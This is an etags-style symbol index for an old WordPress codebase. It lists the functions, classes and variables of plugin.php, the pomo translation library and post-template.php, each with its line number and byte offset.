function do_action($tag, $arg = '') {do_action357,12835
function do_action($tag, $arg = '') {arg357,12835
		$wp_actions = array();wp_actions361,12973
		$all_args = func_get_args();all_args371,13182
	$args = array();args384,13432
	for ( $a = 2; $a < func_num_args(); $a++ )a389,13596
function did_action($tag) {did_action421,14430
 * @see do_action() This function is identical, but the arguments passed to theis433,14682
function do_action_ref_array($tag, $args) {do_action_ref_array446,15255
		$wp_actions = array();wp_actions450,15399
		$all_args = func_get_args();all_args460,15608
 * @param callback $function_to_check optional. If specified, return the priority of that function on this hook or false if not attached.on500,16526
function has_action($tag, $function_to_check = false) {has_action503,16764
function has_action($tag, $function_to_check = false) {function_to_check503,16764
 * Removes a function from a specified action hook.from508,16873
 * This function removes a function attached to a specified action hook. Thisremoves510,16928
 * @param string $tag The action hook to which the function to be removed is hooked.to518,17203
 * @param callback $function_to_remove The name of the function which should be removed.which519,17288
 * @param int $accepted_args optional. The number of arguments the function accepts (default: 1).accepts521,17454
 * @return boolean Whether the function is removed.is522,17552
function remove_action($tag, $function_to_remove, $priority = 10, $accepted_args = 1) {remove_action524,17608
function remove_action($tag, $function_to_remove, $priority = 10, $accepted_args = 1) {priority524,17608
function remove_all_actions($tag, $priority = false) {remove_all_actions537,18003
function remove_all_actions($tag, $priority = false) {priority537,18003
function plugin_basename($file) {plugin_basename560,18453
	$file = str_replace('\\','/',$file); // sanitize for Win32 installsfile561,18487
	$file = preg_replace('|/+|','/', $file); // remove any duplicate slashfile562,18556
	$plugin_dir = str_replace('\\','/',WP_PLUGIN_DIR); // sanitize for Win32 installsplugin_dir563,18628
	$plugin_dir = preg_replace('|/+|','/', $plugin_dir); // remove any duplicate slashplugin_dir564,18711
	$mu_plugin_dir = str_replace('\\','/',WPMU_PLUGIN_DIR); // sanitize for Win32 installsmu_plugin_dir565,18795
	$mu_plugin_dir = preg_replace('|/+|','/', $mu_plugin_dir); // remove any duplicate slashmu_plugin_dir566,18883
	$file = preg_replace('#^' . preg_quote($plugin_dir, '#') . '/|^' . preg_quote($mu_plugin_dir, '#') . '/#','',$file); // get relative path from plugins dirfile567,18973
	$file = trim($file, '/');file568,19129
function plugin_dir_path( $file ) {plugin_dir_path581,19478
function plugin_dir_url( $file ) {plugin_dir_url594,19852
 * @param callback $function the function hooked to the 'activate_PLUGIN' action.hooked615,20663
function register_activation_hook($file, $function) {register_activation_hook617,20749
	$file = plugin_basename($file);file618,20803
 * @param callback $function the function hooked to the 'activate_PLUGIN' action.hooked640,21615
function register_deactivation_hook($file, $function) {register_deactivation_hook642,21701
	$file = plugin_basename($file);file643,21757
 * function will be run during the uninstall process. The plugin should notwill657,22333
function register_uninstall_hook( $file, $callback ) {register_uninstall_hook672,23000
		_doing_it_wrong( __FUNCTION__, __( 'Only a static class method or function can be used in an uninstall hook.' ), '3.1' );method674,23116
		_doing_it_wrong( __FUNCTION__, __( 'Only a static class method or function can be used in an uninstall hook.' ), '3.1' );can674,23116
	$uninstallable_plugins = (array) get_option('uninstall_plugins');uninstallable_plugins681,23427
 * the hook, which this function was called for.was690,23779
 * This function is used internally for apply_filters(), do_action(), andis692,23831
 * functions. This function does not check for the existence of the all hook, sodoes694,23977
 * it will fail unless the all hook exists prior to this function call.call695,24058
function _wp_call_all_hook($args) {_wp_call_all_hook707,24458
 * The old way to serialize the callback caused issues and this function is theis722,24802
 * the class to keep track of the object and new objects of the same class thatto724,24962
 * change class properties. It is possible to include the property $wp_filter_idproperties728,25146
 * in your class and set it to "null" or a number to bypass the workaround.and729,25227
 * @return string|bool Unique ID for usage as array key or false if $priority === false and $function is an object reference, and it does not already have a unique id.priority746,26071
function _wp_filter_build_unique_id($tag, $function, $priority) {_wp_filter_build_unique_id748,26243
	static $filter_id_count = 0;filter_id_count750,26329
	static $filter_id_count = 0;filter_id_count750,26329
		$function = array( $function, '' );function757,26492
		$function = (array) $function;function759,26540
			$obj_idx = get_class($function[0]).$function[1];obj_idx767,26749

wordpress/wp-includes/pomo/entry.php,1663
 * Translation_Entry class encapsulates a translatable stringencapsulates12,206
class Translation_Entry {Translation_Entry14,272
	var $is_plural = false;is_plural21,408
	var $is_plural = false;is_plural21,408
	var $context = null;context23,434
	var $context = null;context23,434
	var $singular = null;singular24,456
	var $singular = null;singular24,456
	var $plural = null;plural25,479
	var $plural = null;plural25,479
	var $translations = array();translations26,500
	var $translations = array();translations26,500
	var $translator_comments = '';translator_comments27,530
	var $translator_comments = '';translator_comments27,530
	var $extracted_comments = '';extracted_comments28,562
	var $extracted_comments = '';extracted_comments28,562
	var $references = array();references29,593
	var $references = array();references29,593
	var $flags = array();flags30,621
	var $flags = array();flags30,621
	function Translation_Entry($args=array()) {Translation_Entry43,1408
		foreach ($args as $varname => $value) {varname49,1586
		if (isset($args['plural'])) $this->is_plural = true;is_plural52,1661
		if (!is_array($this->translations)) $this->translations = array();translations53,1716
		if (!is_array($this->references)) $this->references = array();references54,1785
		if (!is_array($this->flags)) $this->flags = array();flags55,1850
	function key() {key63,2028
	function merge_with(&$other) {merge_with69,2235
		$this->flags = array_unique( array_merge( $this->flags, $other->flags ) );flags70,2267
		$this->references = array_unique( array_merge( $this->references, $other->references ) );references71,2344

wordpress/wp-includes/pomo/mo.php,4332
class MO extends Gettext_Translations {MO14,284
	var $_nplurals = 2;_nplurals16,325
	var $_nplurals = 2;_nplurals16,325
	function import_from_file($filename) {import_from_file23,458
		$reader = new POMO_FileReader($filename);reader24,498
	function export_to_file($filename) {export_to_file30,639
		$fh = fopen($filename, 'wb');fh31,677
		$res = $this->export_to_file_handle( $fh );res33,737
	function export() {export38,818
		$tmp_fh = fopen("php://temp", 'r+');tmp_fh39,839
	function export_to_file_handle($fh) {export_to_file_handle46,1020
		$entries = array_filter($this->entries, create_function('$e', 'return !empty($e->translations);'));entries47,1059
		$magic = 0x950412de;magic49,1180
		$revision = 0;revision50,1203
		$total = count($entries) + 1; // all the headers are one entrytotal51,1220
		$originals_lenghts_addr = 28;originals_lenghts_addr52,1285
		$translations_lenghts_addr = $originals_lenghts_addr + 8 * $total;translations_lenghts_addr53,1317
		$size_of_hash = 0;size_of_hash54,1386
		$hash_addr = $translations_lenghts_addr + 8 * $total;hash_addr55,1407
		$current_addr = $hash_addr;current_addr56,1463
		$originals_table = chr(0);originals_table64,1775
			$length = strlen($this->export_original($entry));length68,1901
		$exported_headers = $this->export_headers();exported_headers73,2081
		$translations_table = $exported_headers . chr(0);translations_table76,2247
			$length = strlen($this->export_translations($entry));length80,2405
	function export_original($entry) {export_original90,2643
		$exported = $entry->singular;exported92,2721
		if (!is_null($entry->context)) $exported = $entry->context . chr(4) . $exported;exported94,2814
	function export_translations($entry) {export_translations98,2922
	function export_headers() {export_headers103,3057
		$exported = '';exported104,3086
		foreach($this->headers as $header => $value) {header105,3104
	function get_byteorder($magic) {get_byteorder111,3217
		$magic_little = (int) - 1794895138;magic_little115,3372
		$magic_little_64 = (int) 2500072158;magic_little_64116,3410
		$magic_big = ((int) - 569244523) & 0xFFFFFFFF;magic_big118,3465
		if ($magic_little == $magic || $magic_little_64 == $magic) {magic_little_64119,3514
	function import_from_reader($reader) {import_from_reader128,3687
		$endian_string = MO::get_byteorder($reader->readint32());endian_string129,3727
		$endian = ('big' == $endian_string)? 'N' : 'V';endian135,3881
		$header = $reader->read(24);header137,3932
		$header = unpack("{$endian}revision/{$endian}total/{$endian}originals_lenghts_addr/{$endian}translations_lenghts_addr/{$endian}hash_length/{$endian}hash_addr", $header);header142,4037
		$originals_lengths_length = $translations_lenghts_addr - $originals_lenghts_addr;originals_lengths_length156,4464
		$originals = $reader->read($originals_lengths_length);originals160,4615
		$translations_lenghts_length = $hash_addr - $translations_lenghts_addr;translations_lenghts_length165,4790
		$translations = $reader->read($translations_lenghts_length);translations169,4934
		$originals    = $reader->str_split( $originals, 8 );originals174,5133
		$translations = $reader->str_split( $translations, 8 );translations175,5188
		$strings_addr = $hash_addr + $hash_length * 4;strings_addr178,5268
		$strings = $reader->read_all();strings182,5353
		for ( $i = 0; $i < $total; $i++ ) {i185,5408
			$o = unpack( "{$endian}length/{$endian}pos", $originals[$i] );o186,5446
			$t = unpack( "{$endian}length/{$endian}pos", $translations[$i] );t187,5512
			$original    = $reader->substr( $strings, $o['pos'], $o['length'] );original194,5748
			$translation = $reader->substr( $strings, $t['pos'], $t['length'] );translation195,5820
				$headers = $this->make_headers($translation);headers198,5920
				$entry = &$this->make_entry($original, $translation);entry201,6016
	function &make_entry($original, $translation) {make_entry218,6549
		$entry = new Translation_Entry();entry219,6598
		$parts = explode(chr(4), $original);parts221,6656
			$original = $parts[1];original223,6721
		$parts = explode(chr(0), $original);parts227,6813
	function select_plural_form($count) {select_plural_form238,7101
	function get_plural_forms_count() {get_plural_forms_count242,7196

wordpress/wp-includes/pomo/po.php,5045
define('PO_MAX_LINE_LEN', 79);PO_MAX_LINE_LEN12,205
class PO extends Gettext_Translations {PO20,354
	var $comments_before_headers = '';comments_before_headers22,396
	var $comments_before_headers = '';comments_before_headers22,396
	function export_headers() {export_headers29,583
		$header_string = '';header_string30,612
		foreach($this->headers as $header => $value) {header31,635
		$poified = PO::poify($header_string);poified34,729
			$before_headers = $this->prepend_each_line(rtrim($this->comments_before_headers)."\n", '# ');before_headers36,807
			$before_headers = '';before_headers38,911
	function export_entries() {export_entries47,1148
	function export($include_headers = true) {export58,1504
		$res = '';res59,1548
	function export_to_file($filename, $include_headers = true) {export_to_file75,1958
	function export_to_file($filename, $include_headers = true) {include_headers75,1958
		$fh = fopen($filename, 'w');fh76,2021
		$export = $this->export($include_headers);export78,2087
		$res = fwrite($fh, $export);res79,2132
	function set_comment_before_headers( $text ) {set_comment_before_headers89,2397
		$this->comments_before_headers = $text;comments_before_headers90,2445
	function poify($string) {poify100,2635
		$quote = '"';quote101,2662
		$slash = '\\';slash102,2678
		$newline = "\n";newline103,2695
		$replaces = array(replaces105,2715
		$string = str_replace(array_keys($replaces), array_values($replaces), $string);string111,2824
		$po = $quote.implode("${slash}n$quote$newline$quote", explode($newline, $string)).$quote;po113,2907
			$po = "$quote$quote$newline$po";po117,3194
		$po = str_replace("$newline$quote$quote", '', $po);po120,3260
	function unpoify($string) {unpoify131,3504
		$escapes = array('t' => "\t", 'n' => "\n", '\\' => '\\');escapes132,3533
		$lines = array_map('trim', explode("\n", $string));lines133,3593
		$lines = array_map(array('PO', 'trim_quotes'), $lines);lines134,3647
		$unpoified = '';unpoified135,3705
		$previous_is_backslash = false;previous_is_backslash136,3724
			$chars = $chars[0];chars139,3829
						$previous_is_backslash = true;previous_is_backslash143,3941
					$previous_is_backslash = false;previous_is_backslash147,4028
	function prepend_each_line($string, $with) {prepend_each_line163,4410
		$php_with = var_export($with, true);php_with164,4456
		$lines = explode("\n", $string);lines165,4495
		$res = implode("\n", array_map(create_function('$x', "return $php_with.\$x;"), $lines));res168,4674
	function comment_block($text, $char=' ') {comment_block183,5161
	function comment_block($text, $char=' ') {char183,5161
		$text = wordwrap($text, PO_MAX_LINE_LEN - 3);text184,5205
	function export_entry(&$entry) {export_entry196,5553
		$po = array();po198,5634
			$translation = empty($entry->translations)? '' : $entry->translations[0];translation206,6199
			$translations = empty($entry->translations)? array('', '') : $entry->translations;translations210,6387
			foreach($translations as $i => $translation) {i211,6473
	function import_from_file($filename) {import_from_file218,6616
		$f = fopen($filename, 'r');f219,6656
		$lineno = 0;lineno221,6711
			$res = $this->read_entry($f, $lineno);res223,6743
	function read_entry($f, $lineno = 0) {read_entry235,7041
	function read_entry($f, $lineno = 0) {lineno235,7041
		$entry = new Translation_Entry();entry236,7081
		$context = '';context239,7227
		$msgstr_index = 0;msgstr_index240,7244
		$is_final = create_function('$context', 'return $context == "msgstr" || $context == "msgstr_plural";');is_final241,7265
			$line = PO::read_line($f);line244,7402
			$line = trim($line);line258,7700
				$context = 'msgctxt';context281,8326
				$context = 'msgid';context292,8650
				$context = 'msgid_plural';context298,8840
				$context = 'msgstr';context305,9059
				$context = 'msgstr_plural';context311,9301
				$msgstr_index = $m[1];msgstr_index312,9333
				$unpoified = PO::unpoify($line);unpoified315,9460
	function read_line($f, $action = 'read') {read_line340,10167
	function read_line($f, $action = 'read') {action340,10167
		static $last_line = '';last_line341,10211
		static $last_line = '';last_line341,10211
		static $use_last_line = false;use_last_line342,10237
		static $use_last_line = false;use_last_line342,10237
			$last_line = '';last_line344,10298
			$use_last_line = true;use_last_line348,10369
		$line = $use_last_line? $last_line : fgets($f);line351,10415
		$last_line = $line;last_line352,10465
		$use_last_line = false;use_last_line353,10487
	function add_comment_to_entry(&$entry, $po_comment_line) {add_comment_to_entry357,10534
		$first_two = substr($po_comment_line, 0, 2);first_two358,10594
		$comment = trim(substr($po_comment_line, 2));comment359,10641
	function trim_quotes($s) {trim_quotes371,11142
		if ( substr($s, 0, 1) == '"') $s = substr($s, 1);s372,11170
		if ( substr($s, -1, 1) == '"') $s = substr($s, 0, -1);s373,11222

wordpress/wp-includes/pomo/streams.php,2888
class POMO_Reader {POMO_Reader12,284
	var $endian = 'little';endian14,306
	var $endian = 'little';endian14,306
	var $_post = '';_post15,331
	var $_post = '';_post15,331
	function POMO_Reader() {POMO_Reader17,351
		$this->is_overloaded = ((ini_get("mbstring.func_overload") & 2) != 0) && function_exists('mb_substr');is_overloaded18,377
		$this->_pos = 0;_pos19,482
	function setEndian($endian) {setEndian27,601
		$this->endian = $endian;endian28,632
	function readint32() {readint3237,856
		$bytes = $this->read(4);bytes38,880
		$endian_letter = ('big' == $this->endian)? 'N' : 'V';endian_letter41,958
		$int = unpack($endian_letter, $bytes);int42,1014
	function readint32array($count) {readint32array53,1302
		$bytes = $this->read(4 * $count);bytes54,1337
		$endian_letter = ('big' == $this->endian)? 'N' : 'V';endian_letter57,1431
	function substr($string, $start, $length) {substr62,1542
	function strlen($string) {strlen70,1737
	function str_split($string, $chunk_size) {str_split78,1881
			$length = $this->strlen($string);length80,1964
			$out = array();out81,2001
	function pos() {pos91,2207
	function is_resource() {is_resource95,2251
	function close() {close99,2297
class POMO_FileReader extends POMO_Reader {POMO_FileReader106,2388
	function POMO_FileReader($filename) {POMO_FileReader107,2432
		$this->_f = fopen($filename, 'rb');_f109,2496
	function read($bytes) {read112,2539
	function seekto($pos) {seekto116,2604
		$this->_pos = $pos;_pos120,2699
	function is_resource() {is_resource124,2741
	function feof() {feof128,2805
	function close() {close132,2855
	function read_all() {read_all136,2908
		$all = '';all137,2931
class POMO_StringReader extends POMO_Reader {POMO_StringReader150,3169
	var $_str = '';_str152,3217
	var $_str = '';_str152,3217
	function POMO_StringReader($str = '') {POMO_StringReader154,3236
		$this->_str = $str;_str156,3302
		$this->_pos = 0;_pos157,3324
	function read($bytes) {read161,3348
		$data = $this->substr($this->_str, $this->_pos, $bytes);data162,3373
		if ($this->strlen($this->_str) < $this->_pos) $this->_pos = $this->strlen($this->_str);_pos164,3457
	function seekto($pos) {seekto168,3567
		$this->_pos = $pos;_pos169,3592
		if ($this->strlen($this->_str) < $this->_pos) $this->_pos = $this->strlen($this->_str);_pos170,3614
	function length() {length174,3730
	function read_all() {read_all178,3792
class POMO_CachedFileReader extends POMO_StringReader {POMO_CachedFileReader189,4017
	function POMO_CachedFileReader($filename) {POMO_CachedFileReader190,4073
		$this->_str = file_get_contents($filename);_str192,4149
		$this->_pos = 0;_pos195,4241
class POMO_CachedIntFileReader extends POMO_CachedFileReader {POMO_CachedIntFileReader204,4385
	function POMO_CachedIntFileReader($filename) {POMO_CachedIntFileReader205,4448

wordpress/wp-includes/pomo/translations.php,4665
class Translations {Translations13,298
	var $entries = array();entries14,319
	var $entries = array();entries14,319
	var $headers = array();headers15,344
	var $headers = array();headers15,344
	function add_entry($entry) {add_entry23,516
			$entry = new Translation_Entry($entry);entry25,572
		$key = $entry->key();key27,619
	function add_entry_or_merge($entry) {add_entry_or_merge33,733
			$entry = new Translation_Entry($entry);entry35,798
		$key = $entry->key();key37,845
	function set_header($header, $value) {set_header56,1346
	function set_headers(&$headers) {set_headers60,1426
		foreach($headers as $header => $value) {header61,1461
	function get_header($header) {get_header66,1551
	function translate_entry(&$entry) {translate_entry70,1661
		$key = $entry->key();key71,1698
	function translate($singular, $context=null) {translate75,1794
	function translate($singular, $context=null) {context75,1794
		$entry = new Translation_Entry(array('singular' => $singular, 'context' => $context));entry76,1842
		$translated = $this->translate_entry($entry);translated77,1931
	 * This function should be overrided by the sub-classes. For example MO/PO can derive the logicshould87,2313
	function select_plural_form($count) {select_plural_form92,2485
	function get_plural_forms_count() {get_plural_forms_count96,2557
	function translate_plural($singular, $plural, $count, $context = null) {translate_plural100,2610
	function translate_plural($singular, $plural, $count, $context = null) {context100,2610
		$entry = new Translation_Entry(array('singular' => $singular, 'plural' => $plural, 'context' => $context));entry101,2684
		$translated = $this->translate_entry($entry);translated102,2794
		$index = $this->select_plural_form($count);index103,2842
		$total_plural_forms = $this->get_plural_forms_count();total_plural_forms104,2888
	function merge_with(&$other) {merge_with119,3374
	function merge_originals_with(&$other) {merge_originals_with125,3499
class Gettext_Translations extends Translations {Gettext_Translations135,3749
	function gettext_select_plural_form($count) {gettext_select_plural_form143,4001
			$this->_nplurals = $nplurals;_nplurals146,4262
			$this->_gettext_select_plural_form = $this->make_plural_form_function($nplurals, $expression);_gettext_select_plural_form147,4295
	function nplurals_and_expression_from_header($header) {nplurals_and_expression_from_header152,4471
			$nplurals = (int)$matches[1];nplurals154,4622
			$expression = trim($this->parenthesize_plural_exression($matches[2]));expression155,4655
	function make_plural_form_function($nplurals, $expression) {make_plural_form_function166,4939
		$expression = str_replace('n', '$n', $expression);expression167,5001
		$func_body = "func_body168,5054
	function parenthesize_plural_exression($expression) {parenthesize_plural_exression181,5495
		$res = '';res183,5572
		$depth = 0;depth184,5585
			$char = $expression[$i];char186,5648
					$depth= 0;depth197,5864
	function make_headers($translation) {make_headers206,5966
		$headers = array();headers207,6005
		$translation = str_replace('\n', "\n", $translation);translation209,6081
		$lines = explode("\n", $translation);lines210,6137
			$parts = explode(':', $line, 2);parts212,6206
	function set_header($header, $value) {set_header219,6354
			$this->_nplurals = $nplurals;_nplurals223,6583
			$this->_gettext_select_plural_form = $this->make_plural_form_function($nplurals, $expression);_gettext_select_plural_form224,6616
 * Provides the same interface as Translations, but doesn't do anythingas232,6780
class NOOP_Translations {NOOP_Translations234,6856
	var $entries = array();entries235,6882
	var $entries = array();entries235,6882
	var $headers = array();headers236,6907
	var $headers = array();headers236,6907
	function add_entry($entry) {add_entry238,6934
	function set_header($header, $value) {set_header242,6983
	function set_headers(&$headers) {set_headers245,7027
	function get_header($header) {get_header248,7066
	function translate_entry(&$entry) {translate_entry252,7118
	function translate($singular, $context=null) {translate256,7175
	function translate($singular, $context=null) {context256,7175
	function select_plural_form($count) {select_plural_form260,7247
	function get_plural_forms_count() {get_plural_forms_count264,7319
	function translate_plural($singular, $plural, $count, $context = null) {translate_plural268,7372
	function translate_plural($singular, $plural, $count, $context = null) {context268,7372
	function merge_with(&$other) {merge_with272,7494

wordpress/wp-includes/post-template.php,17034
function the_ID() {the_ID16,242
function get_the_ID() {get_the_ID28,407
function the_title($before = '', $after = '', $echo = true) {the_title43,854
function the_title($before = '', $after = '', $echo = true) {after43,854
	$title = get_the_title();title44,916
	$title = $before . $title . $after;title49,983
 * an array. See the function for what can be override in the $args parameter.for61,1223
function the_title_attribute( $args = '' ) {the_title_attribute72,1676
function the_title_attribute( $args = '' ) {args72,1676
	$title = get_the_title();title73,1721
	$defaults = array('before' => '', 'after' =>  '', 'echo' => true);defaults78,1788
	$r = wp_parse_args($args, $defaults);r79,1856
	$title = $before . $title . $after;title82,1923
	$title = esc_attr(strip_tags($title));title83,1960
function get_the_title( $id = 0 ) {get_the_title103,2370
function get_the_title( $id = 0 ) {id103,2370
	$post = &get_post($id);post104,2406
	$title = isset($post->post_title) ? $post->post_title : '';title106,2432
	$id = isset($post->ID) ? $post->ID : (int) $id;id107,2493
			$protected_title_format = apply_filters('protected_title_format', __('Protected: %s'));protected_title_format111,2605
			$title = sprintf($protected_title_format, $title);title112,2696
			$private_title_format = apply_filters('private_title_format', __('Private: %s'));private_title_format114,2829
			$title = sprintf($private_title_format, $title);title115,2914
function the_guid( $id = 0 ) {the_guid134,3372
function the_guid( $id = 0 ) {id134,3372
function get_the_guid( $id = 0 ) {get_the_guid150,3767
function get_the_guid( $id = 0 ) {id150,3767
	$post = &get_post($id);post151,3802
function the_content($more_link_text = null, $stripteaser = false) {the_content164,4120
function the_content($more_link_text = null, $stripteaser = false) {stripteaser164,4120
	$content = get_the_content($more_link_text, $stripteaser);content165,4189
	$content = apply_filters('the_content', $content);content166,4249
	$content = str_replace(']]>', ']]&gt;', $content);content167,4301
function get_the_content($more_link_text = null, $stripteaser = false) {get_the_content180,4628
function get_the_content($more_link_text = null, $stripteaser = false) {stripteaser180,4628
		$more_link_text = __( '(more...)' );more_link_text184,4794
	$output = '';output186,4834
	$hasTeaser = false;hasTeaser187,4849
		$page = count($pages); // give them the highest numbered page that DOES existpage194,5076
	$content = $pages[$page-1];content196,5157
		$content = explode($matches[0], $content, 2);content198,5250
			$more_link_text = strip_tags(wp_kses_no_null(trim($matches[1])));more_link_text200,5354
		$hasTeaser = true;hasTeaser202,5424
		$content = array($content);content204,5455
		$stripteaser = true;stripteaser207,5588
	$teaser = $content[0];teaser208,5611
		$teaser = '';teaser210,5679
			$output = force_balance_tags($output);output218,6052
		$output =	preg_replace_callback('/\%u([0-9A-F]{4})/', '_convert_urlencoded_to_entities', $output);output223,6176
function _convert_urlencoded_to_entities( $match ) {_convert_urlencoded_to_entities236,6482
function the_excerpt() {the_excerpt246,6716
function get_the_excerpt( $deprecated = '' ) {get_the_excerpt258,6914
function get_the_excerpt( $deprecated = '' ) {deprecated258,6914
	$output = $post->post_excerpt;output263,7054
		$output = __('There is no excerpt because this is a protected post.');output265,7126
function has_excerpt( $id = 0 ) {has_excerpt280,7387
function has_excerpt( $id = 0 ) {id280,7387
	$post = &get_post( $id );post281,7421
 * @param string|array $class One or more classes to add to the class list.list290,7561
function post_class( $class = '', $post_id = null ) {post_class293,7685
function post_class( $class = '', $post_id = null ) {class293,7685
 * The class names are add are many. If the post is a sticky, then the 'sticky'names301,7949
 * class name. The class 'hentry' is always added to each post. For eachname302,8029
 * category, the class will be added with 'category-' with category slug iswill303,8102
 * @param string|array $class One or more classes to add to the class list.list311,8454
function get_post_class( $class = '', $post_id = null ) {get_post_class315,8613
function get_post_class( $class = '', $post_id = null ) {class315,8613
	$post = get_post($post_id);post316,8671
	$classes = array();classes318,8701
		$post_format = get_post_format( $post->ID );post_format330,9001
			$class = preg_split('#\s+#', $class);class369,10066
		$classes = array_merge($classes, $class);classes370,10107
	$classes = array_map('esc_attr', $classes);classes373,10155
 * @param string|array $class One or more classes to add to the class list.list383,10341
function body_class( $class = '' ) {body_class385,10421
function body_class( $class = '' ) {class385,10421
 * @param string|array $class One or more classes to add to the class list.list395,10685
function get_body_class( $class = '' ) {get_body_class398,10800
function get_body_class( $class = '' ) {class398,10800
	$classes = array();classes401,10868
		$post_id = $wp_query->get_queried_object_id();post_id426,11393
		$post = $wp_query->get_queried_object();post427,11442
			$post_format = get_post_format( $post->ID );post_format435,11708
			$mime_type = get_post_mime_type($post_id);mime_type444,11966
			$mime_prefix = array( 'application/', 'image/', 'text/', 'audio/', 'video/', 'music/' );mime_prefix445,12012
			$author = $wp_query->get_queried_object();author454,12451
			$cat = $wp_query->get_queried_object();cat459,12684
			$tags = $wp_query->get_queried_object();tags464,12906
			$term = $wp_query->get_queried_object();term469,13117
		$page_id = $wp_query->get_queried_object_id();page_id477,13400
		$post = get_page($page_id);post479,13450
	$page = $wp_query->get( 'page' );page507,14302
		$page = $wp_query->get( 'paged' );page510,14365
			$class = preg_split( '#\s+#', $class );class535,15055
		$classes = array_merge( $classes, $class );classes536,15098
		// Ensure that we always coerce class to being an array.to538,15154
		$class = array();class539,15213
	$classes = array_map( 'esc_attr', $classes );classes542,15237
function post_password_required( $post = null ) {post_password_required555,15640
function post_password_required( $post = null ) {post555,15640
	$post = get_post($post);post558,15711
		$wp_hasher = new PasswordHash(8, true);wp_hasher569,16006
	$hash = stripslashes( $_COOKIE[ 'wp-postpass_' . COOKIEHASH ] );hash572,16052
function sticky_class( $post_id = null ) {sticky_class584,16316
function sticky_class( $post_id = null ) {post_id584,16316
function wp_link_pages($args = '') {wp_link_pages631,18074
	$defaults = array(defaults632,18111
	$r = wp_parse_args( $args, $defaults );r640,18379
	$r = apply_filters( 'wp_link_pages_args', $r );r641,18420
	$output = '';output646,18553
			for ( $i = 1; $i < ($numpages+1); $i = $i + 1 ) {i650,18651
				$j = str_replace('%',$i,$pagelink);j651,18704
				$i = $page - 1;i664,19065
				$i = $page + 1;i669,19223
 * Helper function for wp_link_pages().for686,19481
function _wp_link_page( $i ) {_wp_link_page694,19620
		$url = get_permalink();url698,19698
			$url = add_query_arg( 'page', $i, get_permalink() );url701,19842
			$url = trailingslashit(get_permalink()) . user_trailingslashit("$wp_rewrite->pagination_base/" . $i, 'single_paged');url703,19993
			$url = trailingslashit(get_permalink()) . user_trailingslashit($i, 'single_paged');url705,20121
function post_custom( $key = '' ) {post_custom723,20555
function post_custom( $key = '' ) {key723,20555
	$custom = get_post_custom();custom724,20591
function the_meta() {the_meta741,21006
	if ( $keys = get_post_custom_keys() ) {keys742,21028
			$keyt = trim($key);keyt745,21142
			$values = array_map('trim', get_post_custom_values($key));values748,21224
			$value = implode($values,', ');value749,21286
function wp_dropdown_pages($args = '') {wp_dropdown_pages768,21694
	$defaults = array(defaults769,21735
	$r = wp_parse_args( $args, $defaults );r777,21947
	$pages = get_pages($r);pages780,22016
	$output = '';output781,22041
		$id = $name;id784,22159
		$output = "<select name='" . esc_attr( $name ) . "' id='" . esc_attr( $id ) . "'>\n";output787,22201
	$output = apply_filters('wp_dropdown_pages', $output);output796,22613
function wp_list_pages($args = '') {wp_list_pages812,22927
	$defaults = array(defaults813,22964
	$r = wp_parse_args( $args, $defaults );r822,23269
	$output = '';output825,23338
	$current_page = 0;current_page826,23353
	$exclude_array = ( $r['exclude'] ) ? explode(',', $r['exclude']) : array();exclude_array832,23577
	$pages = get_pages($r);pages837,23787
			$current_page = $wp_query->get_queried_object_id();current_page845,24013
	$output = apply_filters('wp_list_pages', $output, $r);output852,24194
 * wp_list_pages()} function. Check that function for more info on thosefor864,24457
function wp_page_menu( $args = array() ) {wp_page_menu885,25331
function wp_page_menu( $args = array() ) {args885,25331
	$defaults = array('sort_column' => 'menu_order, post_title', 'menu_class' => 'menu', 'echo' => true, 'link_before' => '', 'link_after' => '');defaults886,25374
	$args = wp_parse_args( $args, $defaults );args887,25518
	$args = apply_filters( 'wp_page_menu_args', $args );args888,25562
	$menu = '';menu890,25617
	$list_args = $args;list_args892,25631
			$text = __('Home');text897,25812
			$text = $args['show_home'];text899,25842
		$class = '';class900,25873
			$class = 'class="current_page_item"';class902,25928
		$menu = '<ul>' . $menu . '</ul>';menu920,26593
	$menu = '<div class="' . esc_attr($args['menu_class']) . '">' . $menu . "</div>\n";menu922,26630
	$menu = apply_filters( 'wp_page_menu', $menu, $args );menu923,26715
function walk_page_tree($pages, $depth, $current_page, $r) {walk_page_tree941,27044
		$walker = new Walker_Page;walker943,27133
		$walker = $r['walker'];walker945,27168
	$args = array($pages, $depth, $r, $current_page);args947,27195
function walk_page_dropdown_tree() {walk_page_dropdown_tree958,27533
	$args = func_get_args();args959,27570
		$walker = new Walker_PageDropdown;walker961,27676
		$walker = $args[2]['walker'];walker963,27719
class Walker_Page extends Walker {Walker_Page975,27912
	var $tree_type = 'page';tree_type981,28018
	var $tree_type = 'page';tree_type981,28018
	var $db_fields = array ('parent' => 'post_parent', 'id' => 'ID');db_fields989,28140
	var $db_fields = array ('parent' => 'post_parent', 'id' => 'ID');db_fields989,28140
	function start_lvl( &$output, $depth = 0, $args = array() ) {start_lvl998,28405
	function start_lvl( &$output, $depth = 0, $args = array() ) {depth998,28405
		$indent = str_repeat("\t", $depth);indent999,28468
	function end_lvl( &$output, $depth = 0, $args = array() ) {end_lvl1010,28754
	function end_lvl( &$output, $depth = 0, $args = array() ) {depth1010,28754
		$indent = str_repeat("\t", $depth);indent1011,28815
	function start_el( &$output, $page, $depth, $args, $current_page = 0 ) {start_el1025,29187
	function start_el( &$output, $page, $depth, $args, $current_page = 0 ) {current_page1025,29187
			$indent = str_repeat("\t", $depth);indent1027,29277
			$indent = '';indent1029,29323
		$css_class = array('page_item', 'page-item-'.$page->ID);css_class1032,29370
			$_current_page = get_page( $current_page );_current_page1034,29462
		$css_class = implode( ' ', apply_filters( 'page_css_class', $css_class, $page, $depth, $args, $current_page ) );css_class1046,29991
				$time = $page->post_modified;time1052,30373
				$time = $page->post_date;time1054,30415
	function end_el( &$output, $page, $depth = 0, $args = array() ) {end_el1068,30745
	function end_el( &$output, $page, $depth = 0, $args = array() ) {depth1068,30745
class Walker_PageDropdown extends Walker {Walker_PageDropdown1081,30947
	var $tree_type = 'page';tree_type1087,31061
	var $tree_type = 'page';tree_type1087,31061
	var $db_fields = array ('parent' => 'post_parent', 'id' => 'ID');db_fields1095,31182
	var $db_fields = array ('parent' => 'post_parent', 'id' => 'ID');db_fields1095,31182
	function start_el(&$output, $page, $depth, $args, $id = 0) {start_el1106,31634
	function start_el(&$output, $page, $depth, $args, $id = 0) {id1106,31634
		$pad = str_repeat('&nbsp;', $depth * 3);pad1107,31696
		$title = apply_filters( 'list_pages', $page->post_title, $page );title1113,31905
function the_attachment_link( $id = 0, $fullsize = false, $deprecated = false, $permalink = false ) {the_attachment_link1133,32407
